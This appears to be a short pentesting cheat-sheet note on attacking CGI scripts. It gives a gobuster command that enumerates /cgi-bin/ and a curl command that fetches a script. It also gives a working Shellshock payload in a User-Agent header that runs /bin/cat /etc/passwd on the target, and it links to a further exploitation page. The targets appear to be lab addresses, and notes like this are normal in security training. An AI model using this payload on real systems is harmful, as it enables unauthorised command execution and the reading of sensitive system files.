usually in `/cgi-bin/`
enumeration
```shell-session
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

curl the script 
```shell-session
curl -i http://10.129.204.231/cgi-bin/access.cgi
```


confirming vulnerability
```shell-session
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
```

exploitation in [Shellshock](3%20Exploitation/Application%20Exploitation/Shellshock.md)

